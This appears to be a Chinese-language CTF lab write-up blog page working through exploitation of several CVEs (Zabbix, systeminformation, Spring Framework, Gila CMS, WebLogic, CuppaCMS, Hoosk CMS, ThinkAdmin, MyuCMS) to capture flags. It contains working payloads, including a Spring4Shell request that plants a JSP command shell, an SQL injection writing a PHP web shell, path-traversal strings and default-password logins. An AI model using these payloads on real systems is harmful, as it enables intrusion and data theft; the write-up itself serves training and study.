@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctf-3 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WEBCVE-2022-23134靶标介绍： Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。  根据提示，访问setup.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf-3">
+<meta property="og:url" content="http://example.com/2023/10/15/ctf-3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBCVE-2022-23134靶标介绍： Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。  根据提示，访问setup.php">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015094907913.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015094957163.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015100757731.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015100843811.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015102616726.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015102701411.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015102725990.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015102808937.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015102829913.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015110428162.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015110255899.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015110216808.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015115002392.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015115022210.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015142046994.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015142119813.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015142211446.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015142947573.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015143134641.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015143155894.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015143428370.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015143947330.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015144501431.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015144527128.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015152507425.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015152544804.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015152707259.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153338975.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153407581.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153434920.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153446147.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153503547.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153529928.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153708148.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153717491.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015153736125.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015154118304.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015154139870.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015154214755.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015155028592.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015155106619.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015155144614.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015155159091.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015155224347.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015160206818.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015161053684.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015161350966.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015161549725.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015161636963.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015164213681.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015164256756.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015164345368.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015164443918.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015170443644.png">
+<meta property="og:image" content="http://example.com/2023/10/15/ctf-3/image-20231015170458737.png">
+<meta property="article:published_time" content="2023-10-15T01:45:04.000Z">
+<meta property="article:modified_time" content="2023-10-15T09:06:44.987Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/15/ctf-3/image-20231015094907913.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ctf-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/10/15/ctf-3/" class="article-date">
+  	<time datetime="2023-10-15T01:45:04.000Z" itemprop="datePublished">2023-10-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctf-3
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" rel="tag">春秋云镜</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h3><p><em>靶标介绍：</em></p>
+<p>Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p>
+<p><img src="image-20231015094907913.png" alt="image-20231015094907913"></p>
+<p>根据提示，访问setup.php页面</p>
+<p><img src="image-20231015094957163.png" alt="image-20231015094957163"></p>
+<p>刷新一次抓包，改包</p>
+<p><img src="image-20231015100757731.png" alt="image-20231015100757731"></p>
+<p>放包，成功进入</p>
+<p><img src="image-20231015100843811.png" alt="image-20231015100843811"></p>
+<p>尝试使用Admin，弱密码进入后台</p>
+<p><img src="image-20231015102616726.png" alt="image-20231015102616726"></p>
+<p>将命令修改为ls，点击update</p>
+<p><img src="image-20231015102701411.png" alt="image-20231015102701411"></p>
+<p>点击ping ，就会出现结果</p>
+<p><img src="image-20231015102725990.png" alt="image-20231015102725990"></p>
+<p>同理获取flag值</p>
+<p><img src="image-20231015102808937.png" alt="image-20231015102808937"></p>
+<p><img src="image-20231015102829913.png" alt="image-20231015102829913"></p>
+<h3 id="CVE-2021-21315"><a href="#CVE-2021-21315" class="headerlink" title="CVE-2021-21315"></a>CVE-2021-21315</h3><ul>
+<li>systeminformation存在命令注入</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>systeminformation是一个简单的查询系统和OS信息包</p>
+<p><img src="image-20231015110428162.png" alt="image-20231015110428162"></p>
+<p>根据代码提示，构造/api/osifo?param[]=命令，然后再使用DNSlog外带的方式，使用命令curl -d读取系统本地文件，获取flag值</p>
+<p><img src="image-20231015110255899.png" alt="image-20231015110255899"></p>
+<p><img src="image-20231015110216808.png" alt="image-20231015110216808"></p>
+<h3 id="CVE-2022-22965"><a href="#CVE-2022-22965" class="headerlink" title="CVE-2022-22965"></a>CVE-2022-22965</h3><ul>
+<li>Spring Framework JDK &gt;= 9 远程代码执行漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。</p>
+<p>CVE-2022-22965基于CVE-2010-1622，是CVE-2010-1622的补丁绕过，该漏洞即发送如下参数，导致RCE。</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.32.132:8080</span><br><span class="line"></span><br><span class="line">suffix: %&gt;&#x2F;&#x2F;</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;空两行否则无法执行</span><br></pre></td></tr></table></figure>
+
+<p>抓包，发送给重发器，改包</p>
+<p><img src="image-20231015115002392.png" alt="image-20231015115002392"></p>
+<p>访问相关页面</p>
+<p><img src="image-20231015115022210.png" alt="image-20231015115022210"></p>
+<h3 id="CVE-2020-5515"><a href="#CVE-2020-5515" class="headerlink" title="CVE-2020-5515"></a>CVE-2020-5515</h3><ul>
+<li>Gila CMS 1.11.8 sql注入</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Gila CMS 1.11.8 /admin/sql?query= 存在sql注入</p>
+<p><img src="image-20231015142046994.png" alt="image-20231015142046994"></p>
+<p>根据提示访问/admin/sql页面</p>
+<p><img src="image-20231015142119813.png" alt="image-20231015142119813"></p>
+<p>会发现需要登录，尝试使用admin@admin/admin，成功进入后台</p>
+<p><img src="image-20231015142211446.png" alt="image-20231015142211446"></p>
+<p>查看当前数据库下，没有发现flag值，因此查询所有数据库</p>
+<p><img src="image-20231015142947573.png" alt="image-20231015142947573"></p>
+<p>没有发现flag</p>
+<p>因此寻找其他途径，尝试GilaCMS 1.11.8 – ‘/cm/delete?t=’ LFI（本地文件包含）</p>
+<p><img src="image-20231015143134641.png" alt="image-20231015143134641"></p>
+<p>burp抓包，删除任意帖子，将参数<code>t</code>的值更改为“…/…/…/…/…/…/…/…/flag</p>
+<p><img src="image-20231015143155894.png" alt="image-20231015143155894"></p>
+<p>发送重发器</p>
+<p><img src="image-20231015143428370.png" alt="image-20231015143428370"></p>
+<p>获取flag</p>
+<h3 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h3><ul>
+<li>Oracle Weblogic Server T3 协议远程名称执行漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>在Oracle官方发布的2020年4月关键补丁公告中，两个针对WebLogic Server的严重漏洞（CVE-2020-2883和CVE-2020-2884），允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的Weblogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而导致远程代码被执行。</p>
+<p>访问页面</p>
+<p><img src="image-20231015143947330.png" alt="image-20231015143947330"></p>
+<p>如果了解Weblogic Server可能知道，weblogic服务的管理端口是7001，而7001端口的映射是在56496，因此尝试访问56496端口</p>
+<p>发现也无法访问，直接利用漏洞工具</p>
+<p><img src="image-20231015144501431.png" alt="image-20231015144501431"></p>
+<p>执行命令，读取flag值</p>
+<p><img src="image-20231015144527128.png" alt="image-20231015144527128"></p>
+<h3 id="CVE-2020-26048"><a href="#CVE-2020-26048" class="headerlink" title="CVE-2020-26048"></a>CVE-2020-26048</h3><ul>
+<li>CuppaCMS 任意文件上传</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>CuppaCMS是一套内容管理系统（CMS）。 CuppaCMS 2019-11-12之前版本存在安全漏洞，攻击者可利用该漏洞在图像扩展内上传恶意文件，通过使用文件管理器提供的重命名函数的自定义请求，可以将图像扩展修改为PHP，从而导致远程任意代码执行。</p>
+<p>访问页面</p>
+<p><img src="image-20231015152507425.png" alt="image-20231015152507425"></p>
+<p>尝试admin/admin，弱密码进入，成功进入</p>
+<p><img src="image-20231015152544804.png" alt="image-20231015152544804"></p>
+<p>根据提示找到文件管理点，然后上传一个文件</p>
+<p><img src="image-20231015152707259.png" alt="image-20231015152707259"></p>
+<p><img src="image-20231015153338975.png" alt="image-20231015153338975"></p>
+<p>对其进行重命名，</p>
+<p><img src="image-20231015153407581.png" alt="image-20231015153407581"></p>
+<p>抓包，修改</p>
+<p><img src="image-20231015153434920.png" alt="image-20231015153434920"></p>
+<p><img src="image-20231015153446147.png" alt="image-20231015153446147"></p>
+<p>放包</p>
+<p><img src="image-20231015153503547.png" alt="image-20231015153503547"></p>
+<p>访问对应的页面</p>
+<p><img src="image-20231015153529928.png" alt="image-20231015153529928"></p>
+<p>同理可以使用这一漏洞用蚁剑连接</p>
+<p><img src="image-20231015153708148.png" alt="image-20231015153708148"></p>
+<p><img src="image-20231015153717491.png" alt="image-20231015153717491"></p>
+<p>获取flag</p>
+<p><img src="image-20231015153736125.png" alt="image-20231015153736125"></p>
+<h3 id="CVE-2020-26042"><a href="#CVE-2020-26042" class="headerlink" title="CVE-2020-26042"></a>CVE-2020-26042</h3><ul>
+<li>Hoosk CMS v1.8.0 存在sql注入漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Hoosk CMS v1.8.0 install/index.php 存在sql注入漏洞</p>
+<p>访问页面</p>
+<p><img src="image-20231015154118304.png" alt="image-20231015154118304"></p>
+<p>填写内容，尝试抓包</p>
+<p><img src="image-20231015154139870.png" alt="image-20231015154139870"></p>
+<p>保存文件</p>
+<p>使用sqlmap跑一下，看是否存在注入点</p>
+<p><img src="image-20231015154214755.png" alt="image-20231015154214755"></p>
+<p>发现没有，尝试手动注入</p>
+<p>抓包在url点发现了存在注入点</p>
+<p><img src="image-20231015155028592.png" alt="image-20231015155028592"></p>
+<p>写入一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteName&#x3D;&#39;,siteTitle&#x3D;version()#&amp;siteURL&#x3D;http:&#x2F;&#x2F;baidu.com&amp;dbName&#x3D;mysql&amp;dbUserName&#x3D;root&amp;dbPass&#x3D;root&amp;dbHost&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231015155106619.png" alt="image-20231015155106619"></p>
+<p>访问首页</p>
+<p><img src="image-20231015155144614.png" alt="image-20231015155144614"></p>
+<p>命令执行</p>
+<p><img src="image-20231015155159091.png" alt="image-20231015155159091"></p>
+<p>获取flag值</p>
+<p><img src="image-20231015155224347.png" alt="image-20231015155224347"></p>
+<h3 id="CVE-2020-25540"><a href="#CVE-2020-25540" class="headerlink" title="CVE-2020-25540"></a>CVE-2020-25540</h3><ul>
+<li>Thinkadmin v6任意文件读取漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>ThinkAdmin 6版本存在路径遍历漏洞，可利用该漏洞通过GET请求编码参数任意读取远程服务器上的文件.</p>
+<p><img src="image-20231015160206818.png" alt="image-20231015160206818"></p>
+<p>1.未授权列目录poc</p>
+<p>读取网站根目录Payload: ?s=admin/api.Update/node</p>
+<p>POST:</p>
+<blockquote>
+<p>rules=[“/”]<br>rules=[“…/…/…/”] （目录穿越）</p>
+</blockquote>
+<p><img src="image-20231015161053684.png" alt="image-20231015161053684"></p>
+<p>2、任意文件读取</p>
+<p>使用加密函数对文件名进行加密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($content)</span><br><span class="line">&#123;</span><br><span class="line">    [$chars, $length] &#x3D; [&#39;&#39;, strlen($string &#x3D; iconv(&#39;UTF-8&#39;, &#39;GBK&#x2F;&#x2F;TRANSLIT&#39;, $content))];</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $length; $i++) $chars .&#x3D; str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);</span><br><span class="line">    return $chars;</span><br><span class="line">&#125;</span><br><span class="line">$content&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;flag&quot;;</span><br><span class="line">echo encode($content);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231015161350966.png" alt="image-20231015161350966"></p>
+<p>加密后的文件名为1a1a1b1a1a1b1a1a1b2u302p2v</p>
+<p>s=admin/api.Update/get/encode/1a1a1b1a1a1b1a1a1b2u302p2v</p>
+<p><img src="image-20231015161549725.png" alt="image-20231015161549725"></p>
+<p>解码，获取flag值</p>
+<p><img src="image-20231015161636963.png" alt="image-20231015161636963"></p>
+<h3 id="CVE-2020-21650"><a href="#CVE-2020-21650" class="headerlink" title="CVE-2020-21650"></a>CVE-2020-21650</h3><ul>
+<li>MyuCMS后台rce</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>MyuCMS开源内容管理系统,采用ThinkPHP开发而成的社区商城聚合，插件，模板，轻便快捷容易扩展 其2.2版本中admin.php/config/add方法存在任意命令执行漏洞.</p>
+<p>访问页面</p>
+<p><img src="image-20231015164213681.png" alt="image-20231015164213681"></p>
+<p>根据提示进入后台</p>
+<p><img src="image-20231015164256756.png" alt="image-20231015164256756"></p>
+<p>尝试admin\admin\123456成功进入</p>
+<p><img src="image-20231015164345368.png" alt="image-20231015164345368"></p>
+<p>根据提示访问/admin.php/config/</p>
+<p><img src="image-20231015164443918.png" alt="image-20231015164443918"></p>
+<p>没发现什么点，查找相关攻略</p>
+<p> exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x2F;index.php&#x2F;bbs&#x2F;index&#x2F;download?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag&amp;local&#x3D;1&amp;name</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231015170443644.png" alt="image-20231015170443644"></p>
+<p>打开文件</p>
+<p><img src="image-20231015170458737.png" alt="image-20231015170458737"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/10/16/ctf-4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          ctf-4
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">文件上传</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
